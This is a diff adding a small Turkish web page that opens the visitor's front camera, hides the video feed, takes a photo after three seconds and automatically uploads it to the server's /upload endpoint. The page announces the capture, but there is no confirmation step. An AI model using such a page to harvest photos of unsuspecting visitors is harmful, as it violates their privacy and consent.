@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Kamera Girişi</title>
+</head>
+<body>
+  <h1>📷 Hoş Geldiniz</h1>
+  <p>Kameranız açılıyor, 3 saniye içinde fotoğraf alınacak...</p>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <img id="preview" alt="Önizleme Görseli" style="max-width: 100%; border: 1px solid #ccc; margin-top: 10px;" />
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const preview = document.getElementById('preview');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+
+          const dataUrl = canvas.toDataURL('image/jpeg');
+          preview.src = dataUrl;
+
+          fetch('/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: dataUrl })
+          }).then(res => console.log("📨 Görsel gönderildi."));
+        }, 3000);
+      })
+      .catch(err => console.error("🚫 Kamera erişimi reddedildi:", err));
+  </script>
+</body>
+</html>
